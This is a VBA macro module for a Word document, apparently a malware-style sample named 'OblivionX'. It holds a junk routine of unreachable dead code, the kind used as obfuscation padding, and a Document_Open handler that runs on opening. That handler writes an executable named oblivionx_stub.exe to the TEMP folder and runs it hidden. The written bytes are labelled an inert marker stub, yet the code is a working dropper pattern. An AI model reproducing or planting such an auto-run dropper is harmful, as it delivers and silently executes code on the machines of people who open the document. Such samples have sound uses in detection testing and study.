
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim f As Integer, exe As String
    exe = Environ("TEMP") & "\oblivionx_stub.exe"
    f = FreeFile
    Open exe For Binary As #f
    Put #f, , "MZ-this-is-an-inert-marker-stub"
    Close #f
    Shell exe, 0
End Sub
